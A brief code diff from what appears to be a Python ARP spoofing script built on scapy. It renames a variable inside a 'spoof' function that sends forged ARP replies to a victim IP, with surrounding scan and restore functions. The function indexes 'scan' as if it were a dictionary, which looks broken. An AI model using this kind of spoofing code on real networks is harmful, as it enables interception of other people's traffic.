@@ -27,8 +27,8 @@ def scan(ip):
     return clients
 
 def spoof(victim_ip,host_ip):
-        packet = scapy.ARP(op=2,pdst=victim_ip, hwdst=scan[victim_ip], psrc=host_ip)
-        scapy.send(packet, verbose=False)
+        pkt = scapy.ARP(op=2,pdst=victim_ip, hwdst=scan[victim_ip], psrc=host_ip)
+        scapy.send(pkt, verbose=False)
 
 
 def restore(victim_ip, host_ip):
